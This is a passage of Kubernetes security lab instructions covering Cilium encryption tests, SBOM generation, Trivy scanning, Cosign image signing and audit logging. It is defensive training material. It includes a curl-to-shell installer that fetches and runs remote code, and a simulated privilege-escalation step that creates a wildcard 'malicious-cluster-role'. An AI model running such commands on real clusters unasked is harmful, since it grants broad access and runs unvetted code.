Verify that network policies are properly enforcing security rules.

# Test allowed traffic (should work)
echo "Testing allowed traffic from client-app to web-server..."
CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')
kubectl exec -it $CLIENT_POD -n secure-apps -- curl -s -w "HTTP Status: %{http_code}\n" http://web-server-service.secure-apps.svc.cluster.local

# Create an unauthorized pod to test policy enforcement
cat << 'EOF' > unauthorized-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: unauthorized-client
  namespace: secure-apps
  labels:
    app: unauthorized
spec:
  containers:
  - name: curl
    image: curlimages/curl:7.85.0
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 30; done"]
EOF

kubectl apply -f unauthorized-pod.yaml

# Wait for pod to be ready
kubectl wait --for=condition=ready pod unauthorized-client -n secure-apps --timeout=60s

# Test blocked traffic (should fail or timeout)
echo "Testing blocked traffic from unauthorized pod..."
timeout 10s kubectl exec -it unauthorized-client -n secure-apps -- curl -s http://web-server-service.secure-apps.svc.cluster.local || echo "Traffic blocked as expected"

Subtask 3.6: Advanced Traffic Analysis

Perform detailed analysis of encrypted traffic patterns.

# Analyze traffic by protocol
echo "Analyzing traffic by protocol..."
hubble observe --namespace secure-apps --since 5m --protocol tcp

# Check for any dropped packets
echo "Checking for dropped packets..."
hubble observe --namespace secure-apps --since 5m --verdict DROPPED

# Monitor L7 HTTP traffic
echo "Monitoring L7 HTTP traffic..."
hubble observe --namespace secure-apps --since 5m --protocol http

# Generate a traffic summary report
echo "Generating traffic summary..."
hubble observe --namespace secure-apps --since 10m --output json | jq '.flow_type' | sort | uniq -c

Task 4: Troubleshooting and Validation
Subtask 4.1: Common Troubleshooting Commands

Learn essential commands for troubleshooting encryption and connectivity issues.

# Check Cilium agent logs
kubectl logs -n kube-system ds/cilium --tail=50

# Check Cilium connectivity
cilium connectivity test --test-concurrency 1

# Verify encryption keys
kubectl exec -n kube-system ds/cilium -- cilium encrypt status

# Check endpoint status
kubectl exec -n kube-system ds/cilium -- cilium endpoint list

# Verify policy enforcement
kubectl exec -n kube-system ds/cilium -- cilium policy get

Subtask 4.2: Performance Impact Assessment

Measure the performance impact of encryption on network traffic.

# Test network performance without detailed monitoring
echo "Testing basic connectivity performance..."
CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')

# Simple performance test
kubectl exec -it $CLIENT_POD -n secure-apps -- sh -c '
for i in $(seq 1 10); do
  start_time=$(date +%s%N)
  curl -s http://web-server-service.secure-apps.svc.cluster.local > /dev/null
  end_time=$(date +%s%N)
  duration=$((($end_time - $start_time) / 1000000))
  echo "Request $i: ${duration}ms"
done'

Subtask 4.3: Security Validation

Validate that encryption and security policies are working correctly.

# Check that certificates are properly mounted
kubectl exec -it $CLIENT_POD -n secure-apps -- ls -la /etc/ssl/certs/ 2>/dev/null || echo "Default cert location checked"

# Verify network policy compliance
echo "Verifying network policy compliance..."
kubectl get networkpolicies -n secure-apps
kubectl get ciliumnetworkpolicies -n secure-apps

# Test policy violations
echo "Testing policy violations..."
timeout 5s kubectl exec -it unauthorized-client -n secure-apps -- curl -s http://web-server-service.secure-apps.svc.cluster.local || echo "Unauthorized access properly blocked"

# Check encryption overhead
kubectl top pods -n secure-apps

Cleanup
Subtask 4.4: Clean Up Resources

Remove all resources created during the lab.

# Stop any background processes
pkill -f "kubectl port-forward" 2>/dev/null || true

# Delete test applications
kubectl delete namespace secure-apps

# Delete unauthorized pod
kubectl delete -f unauthorized-pod.yaml --ignore-not-found=true

# Remove configuration files
rm -f web-server.yaml client-app.yaml encryption-policy.yaml l7-auth-policy.yaml unauthorized-pod.yaml

# Optional: Uninstall Cilium (only if you want to completely remove it)
# cilium uninstall

echo "Cleanup completed successfully!"

Conclusion

Congratulations! You have successfully completed Lab 13: Managing Pod-to-Pod Encryption. In this comprehensive lab, you have accomplished the following:

Key Achievements:

• Deployed Cilium Service Mesh: You installed and configured Cilium with WireGuard encryption, providing transparent Pod-to-Pod encryption across your Kubernetes cluster.

• Implemented Network Security Policies: You created and applied Cilium Network Policies to control traffic flow and enforce security boundaries between applications.

• Configured mTLS Authentication: You generated TLS certificates and configured mutual TLS authentication between services, ensuring both encryption and authentication.

• Enabled Traffic Monitoring: You deployed and used Hubble for comprehensive network observability, allowing you to monitor encrypted traffic flows and verify policy enforcement.

• Performed Security Validation: You tested both authorized and unauthorized traffic patterns to confirm that your security policies are working correctly.

Why This Matters:

Pod-to-Pod encryption is crucial for modern Kubernetes security because:

    Data Protection: Encrypts all network traffic between pods, protecting sensitive data in transit
    Zero Trust Architecture: Implements the principle of "never trust, always verify" within your cluster
    Compliance Requirements: Helps meet regulatory requirements for data encryption and network security
    Defense in Depth: Adds an additional layer of security beyond traditional perimeter defenses
    Observability: Provides detailed insights into network traffic patterns and security policy enforcement

Real-World Applications:

The skills you've learned apply directly to:

    Securing microservices communications in production environments
    Meeting compliance requirements for financial and healthcare applications
    Implementing zero-trust networking in cloud-native architectures
    Troubleshooting network connectivity and security issues
    Monitoring and auditing network traffic for security purposes

This lab has prepared you with practical experience in service mesh security, which is essential for the Certified Kubernetes Security Specialist (CKS) certification and real-world Kubernetes security implementations.







Lab 14: Supply Chain Security Practices Lab
Objectives

By the end of this lab, students will be able to:

• Generate and analyze Software Bill of Materials (SBOM) for container images to understand dependency structures • Perform comprehensive vulnerability scanning of container images using Trivy • Implement container image signing and verification using Cosign for supply chain integrity • Understand the importance of supply chain security in Kubernetes environments • Apply security best practices for container image management and deployment
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Docker containers and container images • Familiarity with Linux command line operations • Basic knowledge of Kubernetes concepts • Understanding of security concepts like digital signatures and certificates • Experience with package managers and dependency management
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.

Your cloud machine includes: • Docker Engine • Trivy vulnerability scanner • Cosign signing tool • Syft SBOM generator • kubectl (Kubernetes CLI) • All required dependencies and utilities
Task 1: Generate and Analyze Software Bill of Materials (SBOM)
Subtask 1.1: Install and Configure SBOM Tools

First, let's verify that Syft (SBOM generator) is available and understand what an SBOM contains.

# Check if Syft is installed
syft version

# If not installed, install Syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Verify installation
syft version

Subtask 1.2: Pull a Sample Container Image

We'll work with a common application image to demonstrate SBOM generation.

# Pull a sample Node.js application image
docker pull node:16-alpine

# Pull a sample Python application image
docker pull python:3.9-slim

# Verify images are downloaded
docker images | grep -E "(node|python)"

Subtask 1.3: Generate SBOM for Container Images

Now let's create SBOMs for our container images in different formats.

# Generate SBOM in JSON format for Node.js image
syft node:16-alpine -o json > node-sbom.json

# Generate SBOM in SPDX format for Python image
syft python:3.9-slim -o spdx-json > python-sbom-spdx.json

# Generate human-readable table format
syft node:16-alpine -o table > node-sbom-table.txt

# Generate SBOM with vulnerability information
syft node:16-alpine -o syft-json > node-detailed-sbom.json

Subtask 1.4: Analyze SBOM Contents

Let's examine the generated SBOMs to understand the dependency structure.

# View the first 50 lines of the JSON SBOM
head -50 node-sbom.json

# Count total number of packages in the Node.js image
cat node-sbom.json | jq '.artifacts | length'

# List all package names and versions
cat node-sbom.json | jq -r '.artifacts[] | "\(.name) - \(.version)"' | head -20

# View the table format for easier reading
cat node-sbom-table.txt | head -30

# Search for specific packages (e.g., OpenSSL)
cat node-sbom.json | jq -r '.artifacts[] | select(.name | contains("ssl")) | "\(.name) - \(.version)"'

Subtask 1.5: Compare SBOMs Between Images

Compare the dependency footprints of different base images.

# Generate SBOM for Alpine vs Ubuntu based images
docker pull node:16-bullseye
syft node:16-bullseye -o json > node-ubuntu-sbom.json

# Compare package counts
echo "Alpine-based packages:"
cat node-sbom.json | jq '.artifacts | length'

echo "Debian-based packages:"
cat node-ubuntu-sbom.json | jq '.artifacts | length'

# Find common packages between images
cat node-sbom.json | jq -r '.artifacts[].name' | sort > alpine-packages.txt
cat node-ubuntu-sbom.json | jq -r '.artifacts[].name' | sort > debian-packages.txt
comm -12 alpine-packages.txt debian-packages.txt | head -10

Task 2: Container Vulnerability Scanning with Trivy
Subtask 2.1: Basic Trivy Vulnerability Scanning

Let's scan our container images for known vulnerabilities.

# Scan the Node.js image for vulnerabilities
trivy image node:16-alpine

# Scan with specific severity levels only
trivy image --severity HIGH,CRITICAL node:16-alpine

# Generate detailed JSON report
trivy image -f json -o node-vuln-report.json node:16-alpine

# Scan the Python image
trivy image --severity MEDIUM,HIGH,CRITICAL python:3.9-slim

Subtask 2.2: Advanced Trivy Scanning Options

Explore different scanning modes and output formats.

# Scan for specific vulnerability types
trivy image --vuln-type os node:16-alpine

# Scan including library vulnerabilities
trivy image --vuln-type os,library python:3.9-slim

# Generate HTML report
trivy image -f template --template "@contrib/html.tpl" -o vulnerability-report.html node:16-alpine

# Scan with custom policies
trivy image --ignore-unfixed node:16-alpine

# Scan filesystem instead of image
mkdir test-app
echo 'FROM node:16-alpine' > test-app/Dockerfile
trivy fs test-app/

Subtask 2.3: Analyze Vulnerability Reports

Let's examine the vulnerability findings in detail.

# View critical vulnerabilities only
trivy image --severity CRITICAL --format json node:16-alpine | jq '.Results[].Vulnerabilities[] | select(.Severity == "CRITICAL") | {VulnerabilityID, PkgName, InstalledVersion, FixedVersion, Title}'

# Count vulnerabilities by severity
trivy image --format json node:16-alpine | jq '.Results[].Vulnerabilities | group_by(.Severity) | map({severity: .[0].Severity, count: length})'

# Find vulnerabilities with available fixes
trivy image --format json node:16-alpine | jq '.Results[].Vulnerabilities[] | select(.FixedVersion != "") | {ID: .VulnerabilityID, Package: .PkgName, Current: .InstalledVersion, Fixed: .FixedVersion}'

# Export vulnerability summary
trivy image --format table node:16-alpine > vulnerability-summary.txt
cat vulnerability-summary.txt

Subtask 2.4: Continuous Vulnerability Monitoring

Set up automated scanning workflows.

# Create a script for regular scanning
cat > scan-images.sh << 'EOF'
#!/bin/bash
IMAGES=("node:16-alpine" "python:3.9-slim" "nginx:alpine")
DATE=$(date +%Y%m%d)

for image in "${IMAGES[@]}"; do
    echo "Scanning $image..."
    trivy image --format json "$image" > "${image//[:\/]/_}-scan-$DATE.json"
    
    # Check for critical vulnerabilities
    CRITICAL_COUNT=$(trivy image --severity CRITICAL --format json "$image" | jq '.Results[].Vulnerabilities | length')
    
    if [ "$CRITICAL_COUNT" -gt 0 ]; then
        echo "WARNING: $image has $CRITICAL_COUNT critical vulnerabilities!"
    fi
done
EOF

chmod +x scan-images.sh
./scan-images.sh

Task 3: Container Image Signing and Verification with Cosign
Subtask 3.1: Install and Configure Cosign

Set up Cosign for container image signing.

# Verify Cosign installation
cosign version

# Generate key pair for signing
cosign generate-key-pair

# This creates cosign.key (private) and cosign.pub (public) files
ls -la cosign.*

# Set environment variable for easier use
export COSIGN_PASSWORD=""

Subtask 3.2: Sign Container Images

Let's sign our container images to ensure integrity.

# First, we need to push an image to a registry we can write to
# For this lab, we'll use a local registry
docker run -d -p 5000:5000 --name registry registry:2

# Tag and push our image to local registry
docker tag node:16-alpine localhost:5000/node:16-alpine
docker push localhost:5000/node:16-alpine

# Sign the image
cosign sign --key cosign.key localhost:5000/node:16-alpine

# Sign with additional annotations
cosign sign --key cosign.key -a "author=security-team" -a "purpose=lab-demo" localhost:5000/node:16-alpine

Subtask 3.3: Verify Signed Images

Now let's verify the signatures we created.

# Verify the signature
cosign verify --key cosign.pub localhost:5000/node:16-alpine

# Verify with specific annotations
cosign verify --key cosign.pub -a "author=security-team" localhost:5000/node:16-alpine

# Generate verification report
cosign verify --key cosign.pub localhost:5000/node:16-alpine --output json > signature-verification.json

# View verification details
cat signature-verification.json | jq '.'

Subtask 3.4: Implement Keyless Signing (Advanced)

Explore keyless signing using OIDC identity.

# Note: This requires OIDC setup, so we'll demonstrate the concept
# In production, you would use:
# cosign sign --oidc-issuer=https://your-oidc-provider localhost:5000/node:16-alpine

# For demonstration, let's create a policy file
cat > image-policy.yaml << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: image-policy
data:
  policy.yaml: |
    apiVersion: kyverno.io/v1
    kind: ClusterPolicy
    metadata:
      name: require-signed-images
    spec:
      validationFailureAction: enforce
      background: false
      rules:
      - name: check-signature
        match:
          resources:
            kinds:
            - Pod
        verifyImages:
        - image: "localhost:5000/*"
          key: |
            -----BEGIN PUBLIC KEY-----
            # Your public key content here
            -----END PUBLIC KEY-----
EOF

cat image-policy.yaml

Subtask 3.5: Integrate Signing into CI/CD Pipeline

Create a sample pipeline script that includes signing.

# Create a sample CI/CD script
cat > secure-pipeline.sh << 'EOF'
#!/bin/bash
set -e

IMAGE_NAME="localhost:5000/secure-app"
IMAGE_TAG="v1.0.0"
FULL_IMAGE="$IMAGE_NAME:$IMAGE_TAG"

echo "=== Secure Container Pipeline ==="

# Step 1: Build image (simulated)
echo "1. Building container image..."
docker tag node:16-alpine "$FULL_IMAGE"

# Step 2: Generate SBOM
echo "2. Generating SBOM..."
syft "$FULL_IMAGE" -o json > "$IMAGE_TAG-sbom.json"

# Step 3: Vulnerability scan
echo "3. Scanning for vulnerabilities..."
trivy image --exit-code 1 --severity HIGH,CRITICAL "$FULL_IMAGE" || {
    echo "Critical vulnerabilities found! Pipeline stopped."
    exit 1
}

# Step 4: Push image
echo "4. Pushing image to registry..."
docker push "$FULL_IMAGE"

# Step 5: Sign image
echo "5. Signing image..."
cosign sign --key cosign.key "$FULL_IMAGE"

# Step 6: Attach SBOM to image
echo "6. Attaching SBOM to image..."
cosign attach sbom --sbom "$IMAGE_TAG-sbom.json" "$FULL_IMAGE"

echo "=== Pipeline completed successfully ==="
EOF

chmod +x secure-pipeline.sh
./secure-pipeline.sh

Task 4: Implementing Supply Chain Security Policies
Subtask 4.1: Create Admission Controller Policies

Set up policies to enforce signed images in Kubernetes.

# Create a namespace for testing
kubectl create namespace secure-workloads

# Create a pod that uses signed image
cat > secure-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: secure-workloads
spec:
  containers:
  - name: app
    image: localhost:5000/node:16-alpine
    ports:
    - containerPort: 3000
EOF

# Apply the pod
kubectl apply -f secure-pod.yaml

# Verify pod is running
kubectl get pods -n secure-workloads

Subtask 4.2: Verify Image Signatures in Kubernetes

Create a verification script for Kubernetes deployments.

# Create verification script
cat > verify-k8s-images.sh << 'EOF'
#!/bin/bash

NAMESPACE=${1:-default}
echo "Verifying images in namespace: $NAMESPACE"

# Get all pods and their images
kubectl get pods -n "$NAMESPACE" -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}' | while read pod_name images; do
    echo "Pod: $pod_name"
    for image in $images; do
        echo "  Checking image: $image"
        if [[ $image == localhost:5000/* ]]; then
            if cosign verify --key cosign.pub "$image" >/dev/null 2>&1; then
                echo "    ✓ Signature verified"
            else
                echo "    ✗ Signature verification failed"
            fi
        else
            echo "    - External image (not verified)"
        fi
    done
done
EOF

chmod +x verify-k8s-images.sh
./verify-k8s-images.sh secure-workloads

Task 5: Supply Chain Security Monitoring and Reporting
Subtask 5.1: Create Security Dashboard Data

Generate comprehensive security reports.

# Create a comprehensive security report
cat > generate-security-report.sh << 'EOF'
#!/bin/bash

REPORT_DATE=$(date +%Y-%m-%d)
REPORT_FILE="supply-chain-security-report-$REPORT_DATE.html"

cat > "$REPORT_FILE" << 'HTML_EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Supply Chain Security Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f0f0f0; padding: 10px; }
        .section { margin: 20px 0; }
        .critical { color: red; font-weight: bold; }
        .high { color: orange; font-weight: bold; }
        .medium { color: yellow; font-weight: bold; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Supply Chain Security Report</h1>
        <p>Generated on: REPORT_DATE_PLACEHOLDER</p>
    </div>
HTML_EOF

# Add SBOM summary
echo "    <div class='section'>" >> "$REPORT_FILE"
echo "        <h2>Software Bill of Materials Summary</h2>" >> "$REPORT_FILE"
echo "        <table>" >> "$REPORT_FILE"
echo "            <tr><th>Image</th><th>Total Packages</th><th>SBOM Generated</th></tr>" >> "$REPORT_FILE"

for image in "node:16-alpine" "python:3.9-slim"; do
    if [ -f "${image//[:\/]/_}-sbom.json" ]; then
        PACKAGE_COUNT=$(cat "${image//[:\/]/_}-sbom.json" 2>/dev/null | jq '.artifacts | length' 2>/dev/null || echo "N/A")
        echo "            <tr><td>$image</td><td>$PACKAGE_COUNT</td><td>✓</td></tr>" >> "$REPORT_FILE"
    fi
done

echo "        </table>" >> "$REPORT_FILE"
echo "    </div>" >> "$REPORT_FILE"

# Add vulnerability summary
echo "    <div class='section'>" >> "$REPORT_FILE"
echo "        <h2>Vulnerability Scan Results</h2>" >> "$REPORT_FILE"
echo "        <p>Last scan performed: $(date)</p>" >> "$REPORT_FILE"
echo "    </div>" >> "$REPORT_FILE"

# Close HTML
echo "</body></html>" >> "$REPORT_FILE"

# Replace placeholder
sed -i "s/REPORT_DATE_PLACEHOLDER/$REPORT_DATE/g" "$REPORT_FILE"

echo "Security report generated: $REPORT_FILE"
EOF

chmod +x generate-security-report.sh
./generate-security-report.sh

Subtask 5.2: Set Up Automated Monitoring

Create monitoring scripts for continuous security assessment.

# Create monitoring script
cat > monitor-supply-chain.sh << 'EOF'
#!/bin/bash

LOG_FILE="supply-chain-monitor.log"
ALERT_THRESHOLD=5  # Alert if more than 5 critical vulnerabilities

log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

check_image_security() {
    local image=$1
    log_message "Checking security for image: $image"
    
    # Check if image is signed
    if cosign verify --key cosign.pub "$image" >/dev/null 2>&1; then
        log_message "✓ Image signature verified: $image"
    else
        log_message "✗ Image signature verification failed: $image"
    fi
    
    # Check vulnerabilities
    CRITICAL_VULNS=$(trivy image --severity CRITICAL --format json "$image" 2>/dev/null | jq '.Results[].Vulnerabilities | length' 2>/dev/null || echo "0")
    
    if [ "$CRITICAL_VULNS" -gt "$ALERT_THRESHOLD" ]; then
        log_message "🚨 ALERT: $image has $CRITICAL_VULNS critical vulnerabilities (threshold: $ALERT_THRESHOLD)"
    else
        log_message "✓ Vulnerability check passed: $image ($CRITICAL_VULNS critical vulnerabilities)"
    fi
}

log_message "Starting supply chain security monitoring"

# Monitor local registry images
for image in $(docker images localhost:5000/* --format "{{.Repository}}:{{.Tag}}"); do
    check_image_security "$image"
done

log_message "Supply chain security monitoring completed"
EOF

chmod +x monitor-supply-chain.sh
./monitor-supply-chain.sh

# View the monitoring log
cat supply-chain-monitor.log

Troubleshooting Common Issues
Issue 1: Cosign Key Generation Problems

# If key generation fails, try with explicit password
export COSIGN_PASSWORD="your-secure-password"
cosign generate-key-pair

# Or generate without password (less secure)
cosign generate-key-pair --skip-password

Issue 2: Registry Connection Issues

# Check if local registry is running
docker ps | grep registry

# Restart registry if needed
docker restart registry

# Test registry connectivity
curl http://localhost:5000/v2/_catalog

Issue 3: Trivy Database Update Issues

# Update Trivy database manually
trivy image --download-db-only

# Clear cache if needed
trivy clean --all

Issue 4: SBOM Generation Failures

# Check if image exists locally
docker images | grep node

# Pull image if missing
docker pull node:16-alpine

# Generate SBOM with verbose output
syft node:16-alpine -v

Conclusion

In this comprehensive lab, you have successfully:

• Generated Software Bill of Materials (SBOM) for container images, providing complete visibility into software dependencies and components • Performed vulnerability scanning using Trivy to identify security risks in container images and understand their severity levels • Implemented container image signing and verification using Cosign to ensure supply chain integrity and prevent tampering • Created security policies for Kubernetes environments to enforce the use of signed and verified images • Built automated monitoring and reporting systems for continuous supply chain security assessment

Why This Matters:

Supply chain security is critical in modern containerized environments because:

    Dependency Visibility: SBOMs provide transparency into what components are included in your applications
    Risk Management: Vulnerability scanning helps identify and prioritize security risks before deployment
    Integrity Assurance: Image signing ensures that containers haven't been tampered with during distribution
    Compliance: Many regulatory frameworks now require supply chain security measures
    Trust: These practices build confidence in your software delivery pipeline

The skills you've learned in this lab are essential for:

    Kubernetes Security Specialists managing container security
    DevSecOps Engineers implementing secure CI/CD pipelines
    Security Architects designing secure container platforms
    Compliance Officers ensuring regulatory adherence

These supply chain security practices form the foundation of a robust container security strategy and are increasingly required in enterprise environments. Continue practicing these techniques and stay updated with the latest security tools and best practices to maintain strong supply chain security posture.





Lab 15: Auditing and Threat Detection Lab
Objectives

By the end of this lab, students will be able to:

• Configure and enable Kubernetes audit logging to track cluster activities • Set up and deploy log collection agents to centralize audit data • Simulate privilege escalation attacks in a controlled environment • Analyze audit logs to identify security threats and suspicious activities • Install and configure Falco for runtime security monitoring • Detect and respond to runtime anomalies using Falco rules • Understand the importance of continuous monitoring in Kubernetes security • Implement best practices for threat detection in containerized environments
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes concepts (pods, services, deployments) • Familiarity with Linux command line operations • Knowledge of YAML configuration files • Understanding of container security fundamentals • Basic knowledge of log analysis concepts • Familiarity with kubectl commands
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click "Start Lab" to begin - no need to build your own VM or install Kubernetes from scratch.

Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.28+ • kubectl pre-configured and ready to use • Docker runtime environment • All necessary tools and dependencies pre-installed
Task 1: Enable Kubernetes Audit Logging and Configure Log Agent
Subtask 1.1: Understanding Kubernetes Audit Logging

Kubernetes audit logging provides a security-relevant chronological set of records documenting the sequence of activities that have affected the system by individual users, administrators, or other components.
Subtask 1.2: Configure Audit Policy

First, let's create an audit policy file that defines what events should be logged.

# Create the audit policy directory
sudo mkdir -p /etc/kubernetes/audit

# Create the audit policy file
sudo tee /etc/kubernetes/audit/audit-policy.yaml > /dev/null <<EOF
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Log pod changes at RequestResponse level
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods"]
# Log service account token requests
- level: Metadata
  resources:
  - group: ""
    resources: ["serviceaccounts/token"]
# Log requests to certain non-resource URL paths
- level: Metadata
  nonResourceURLs:
  - "/api*"
  - "/version"
# Log ConfigMap and Secret changes at Metadata level
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets", "configmaps"]
# Log all other resources at Metadata level
- level: Metadata
  omitStages:
  - RequestReceived
EOF

Subtask 1.3: Configure API Server for Audit Logging

Now we need to modify the API server configuration to enable audit logging.

# Backup the original kube-apiserver manifest
sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup

# Create the audit log directory
sudo mkdir -p /var/log/kubernetes/audit

# Update the kube-apiserver configuration
sudo tee /tmp/apiserver-patch.yaml > /dev/null <<EOF
spec:
  containers:
  - name: kube-apiserver
    command:
    - kube-apiserver
    - --audit-log-path=/var/log/kubernetes/audit/audit.log
    - --audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml
    - --audit-log-maxage=30
    - --audit-log-maxbackup=3
    - --audit-log-maxsize=100
    volumeMounts:
    - name: audit-policy
      mountPath: /etc/kubernetes/audit
      readOnly: true
    - name: audit-log
      mountPath: /var/log/kubernetes/audit
      readOnly: false
  volumes:
  - name: audit-policy
    hostPath:
      path: /etc/kubernetes/audit
      type: DirectoryOrCreate
  - name: audit-log
    hostPath:
      path: /var/log/kubernetes/audit
      type: DirectoryOrCreate
EOF

# Apply the patch to enable audit logging
sudo python3 -c "
import yaml
import sys

# Read the original file
with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'r') as f:
    original = yaml.safe_load(f)

# Add audit parameters to command
audit_flags = [
    '--audit-log-path=/var/log/kubernetes/audit/audit.log',
    '--audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml',
    '--audit-log-maxage=30',
    '--audit-log-maxbackup=3',
    '--audit-log-maxsize=100'
]

for flag in audit_flags:
    if flag not in original['spec']['containers'][0]['command']:
        original['spec']['containers'][0]['command'].append(flag)

# Add volume mounts
volume_mounts = [
    {'name': 'audit-policy', 'mountPath': '/etc/kubernetes/audit', 'readOnly': True},
    {'name': 'audit-log', 'mountPath': '/var/log/kubernetes/audit', 'readOnly': False}
]

if 'volumeMounts' not in original['spec']['containers'][0]:
    original['spec']['containers'][0]['volumeMounts'] = []

for vm in volume_mounts:
    if not any(existing['name'] == vm['name'] for existing in original['spec']['containers'][0]['volumeMounts']):
        original['spec']['containers'][0]['volumeMounts'].append(vm)

# Add volumes
volumes = [
    {'name': 'audit-policy', 'hostPath': {'path': '/etc/kubernetes/audit', 'type': 'DirectoryOrCreate'}},
    {'name': 'audit-log', 'hostPath': {'path': '/var/log/kubernetes/audit', 'type': 'DirectoryOrCreate'}}
]

if 'volumes' not in original['spec']:
    original['spec']['volumes'] = []

for vol in volumes:
    if not any(existing['name'] == vol['name'] for existing in original['spec']['volumes']):
        original['spec']['volumes'].append(vol)

# Write back the modified file
with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'w') as f:
    yaml.dump(original, f, default_flow_style=False)
"

Subtask 1.4: Wait for API Server Restart

# Wait for the API server to restart (this may take a few minutes)
echo "Waiting for API server to restart with audit logging enabled..."
sleep 60

# Check if the API server is running
kubectl get nodes

# Verify audit logging is working
echo "Checking if audit log file is created..."
sudo ls -la /var/log/kubernetes/audit/

Subtask 1.5: Deploy Fluent Bit as Log Agent

Now let's deploy Fluent Bit to collect and forward our audit logs.

# Create namespace for logging
kubectl create namespace logging

# Create Fluent Bit configuration
kubectl create configmap fluent-bit-config -n logging --from-literal=fluent-bit.conf="
[SERVICE]
    Flush         1
    Log_Level     info
    Daemon        off
    Parsers_File  parsers.conf

[INPUT]
    Name              tail
    Path              /var/log/kubernetes/audit/audit.log
    Parser            json
    Tag               kube.audit
    Refresh_Interval  5
    Mem_Buf_Limit     50MB
    Skip_Long_Lines   On

[OUTPUT]
    Name  stdout
    Match *
    Format json_lines
"

# Create Fluent Bit DaemonSet
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: fluent-bit
  namespace: logging
  labels:
    k8s-app: fluent-bit-logging
spec:
  selector:
    matchLabels:
      name: fluent-bit
  template:
    metadata:
      labels:
        name: fluent-bit
    spec:
      serviceAccount: fluent-bit
      serviceAccountName: fluent-bit
      tolerations:
      - key: node-role.kubernetes.io/master
        operator: Exists
        effect: NoSchedule
      containers:
      - name: fluent-bit
        image: fluent/fluent-bit:2.1.10
        imagePullPolicy: Always
        ports:
          - containerPort: 2020
        volumeMounts:
        - name: varlog
          mountPath: /var/log
        - name: fluent-bit-config
          mountPath: /fluent-bit/etc/
      terminationGracePeriodSeconds: 10
      volumes:
      - name: varlog
        hostPath:
          path: /var/log
      - name: fluent-bit-config
        configMap:
          name: fluent-bit-config
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: fluent-bit
  namespace: logging
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: fluent-bit-read
rules:
- apiGroups: [""]
  resources:
  - namespaces
  - pods
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: fluent-bit-read
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: fluent-bit-read
subjects:
- kind: ServiceAccount
  name: fluent-bit
  namespace: logging
EOF

Subtask 1.6: Verify Log Agent Deployment

# Check if Fluent Bit is running
kubectl get pods -n logging

# Wait for the pod to be ready
kubectl wait --for=condition=ready pod -l name=fluent-bit -n logging --timeout=300s

# Check Fluent Bit logs
kubectl logs -n logging -l name=fluent-bit --tail=20

Task 2: Simulate Privilege Escalation Attempt and Analyze Logs
Subtask 2.1: Create a Test Namespace and Service Account

# Create a test namespace
kubectl create namespace security-test

# Create a service account with limited permissions
kubectl create serviceaccount test-user -n security-test

# Create a role with basic permissions
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: security-test
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: security-test
subjects:
- kind: ServiceAccount
  name: test-user
  namespace: security-test
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
EOF

Subtask 2.2: Deploy a Test Pod

# Create a test pod that will attempt privilege escalation
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privilege-escalation-test
  namespace: security-test
spec:
  serviceAccountName: test-user
  containers:
  - name: test-container
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      runAsUser: 1000
      runAsGroup: 1000
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
      readOnlyRootFilesystem: false
EOF

Subtask 2.3: Simulate Privilege Escalation Attempts

# Wait for the pod to be ready
kubectl wait --for=condition=ready pod/privilege-escalation-test -n security-test --timeout=300s

# Attempt 1: Try to access secrets (should fail)
echo "Attempting to access secrets..."
kubectl auth can-i get secrets --as=system:serviceaccount:security-test:test-user -n security-test

# Attempt 2: Try to create privileged resources
echo "Attempting to create cluster roles..."
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: malicious-cluster-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

